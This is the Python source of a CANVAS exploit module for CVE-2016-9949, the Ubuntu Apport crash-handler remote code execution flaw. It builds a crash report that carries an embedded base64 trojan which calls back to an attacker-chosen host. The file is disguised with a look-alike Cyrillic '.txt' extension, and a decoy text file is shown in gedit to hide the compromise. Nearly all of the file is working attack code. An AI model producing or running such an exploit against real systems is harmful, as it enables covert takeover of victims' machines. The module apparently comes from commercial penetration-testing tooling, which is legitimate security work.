#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

import sys
import traceback
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from libs.canvasos import canvasos

import os
import base64
import canvasengine
import logging


NAME                            = "Ubuntu Apport Crash Handler RCE"
DESCRIPTION                     = "Improper treatment of the CrashDB field allows to execute arbitrary python code"
DOCUMENTATION                   = {}
DOCUMENTATION['Vendor']         = "Ubuntu"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION['CVE Name']       = 'CVE-2016-9949'
DOCUMENTATION['CVE Url']        = 'http://people.canonical.com/~ubuntu-security/cve/2016/CVE-2016-9949.html'
DOCUMENTATION['References']     = 'https://donncha.is/2016/12/compromising-ubuntu-desktop/'

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = [ "Ubuntu 14.04", "Ubuntu 16.04", "Ubuntu 16.10" ]

NOTES = """
This module creates a crafted Apport crash file report that seems to be a simple text file. When the text file is double clicked in the host the crash file parser execute the python code due an improper treatement of the CrashDB field as python code and the MOSDEF callback is launched. At the end the crafted crash file is replaced by a decoy text file and gedit program is launched to look like the behavior of a real text file.
Note: An Apport popup window appears for a few seconds when the crash file is parse.

Vulnerable:     Apport 2.20.3
Not Vulnerable: Apport 2.20.4

Tested on:
- Ubuntu 16.04 64bit Desktop with Apport 2.20.1
- Ubuntu 15.10 64bit Desktop with Apport 2.19.1
- Ubuntu 14.04 32bit Desktop with Apport 2.14.1

"""

DOCUMENTATION["Notes"] = NOTES


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.name             = NAME
        self.filename         = None
        self.decoyfile        = None
        self.callback_host    = None
        self.callback_port    = 5555
        self.arch             = None

        self.ssl 	          = 1
        self.mosdef_http      = False
        self.mosdef_ssl       = False
        self.mosdef_universal = True
        self.mosdef_encrypted = False
        self.local_res        = os.path.join(os.path.dirname(__file__), 'Resources')

    def getargs(self):
        self.filename         = self.argsDict.get("output_filename", self.filename)
        if not self.filename:
            self.filename = "apport.txt"

        self.decoyfile        = self.argsDict.get("filename", self.decoyfile)
        if not self.decoyfile:
            self.decoyfile    = os.path.join(self.local_res,"decoy.txt")

        self.callback_host    = self.argsDict.get("callback_host", self.callback_host)
        if not self.callback_host:
            self.callback_host = self.engine.get_callback_interface().ip

        self.callback_port    = self.argsDict.get("callback_port", self.callback_port)
        self.arch             = self.argsDict.get("archtype_radiobutton_value", self.arch)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getShellcode(self):
        self.callback.ip = self.callback_host
        self.callback.port = int(self.callback_port)
        t_os = canvasos("Linux")
        t_os.arch = self.arch
        logging.info("Building Linux MOSDEF trojan - %s:%s" % (self.callback.ip, str(self.callback.port)))

        try:
            self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                       target_os=t_os, http=self.mosdef_http,
                                       ssl=self.mosdef_ssl,
                                       universal=self.mosdef_universal,
                                       encrypted=self.mosdef_encrypted)
        except Exception, err:
            traceback.print_exc()
            logging.error("Problem building the MOSDEF trojan: %s"%(err))
            return None

        self.shellcode = self.mosdeftrojan
        return self.shellcode

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        logging.info("Creating the crash report file")
        filedata = self.makefile()
        if filedata:
            logging.info("Output file: %s" % self.filename)
            self.setInfo("%s - done" % (NAME))
            return 1
        else:
            logging.error("Something went wrong....")
            self.setInfo("%s - failed" % (NAME))
        return 0

    def makefile(self):
        self.setProgress(40)
        shellcode = self.getShellcode()

        if not shellcode:
            return None

        self.setProgress(60)
        template_file = os.path.join(self.local_res,"template.crash")

        fd = open(template_file, "r")
        crash_data = fd.read()
        fd.close()

        #Setting the shellcode
        b64shellcode   = base64.standard_b64encode(shellcode)
        crash_dump_tag = "_CrashDump:\n %s\n" % b64shellcode
        crash_data+= crash_dump_tag
        self.setProgress(80)

        #Setting the decoy file
        fd = open(self.decoyfile, "r")
        decoy_data = fd.read()
        fd.close()

        b64decoy     = base64.b64encode(decoy_data)
        mem_dump_tag = "_MemDump:\n %s\n" % b64decoy
        crash_data+= mem_dump_tag
        self.setProgress(90)

        ext = u".t\u0445t".encode("utf-8")
        if self.filename:
            if "." in self.filename:
                self.filename = self.filename[0:self.filename.find(".")] + ext
            else:
                self.filename+= ext

        fo = open(self.filename, "wb")
        fo.write(crash_data)
        fo.close()

        return crash_data


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
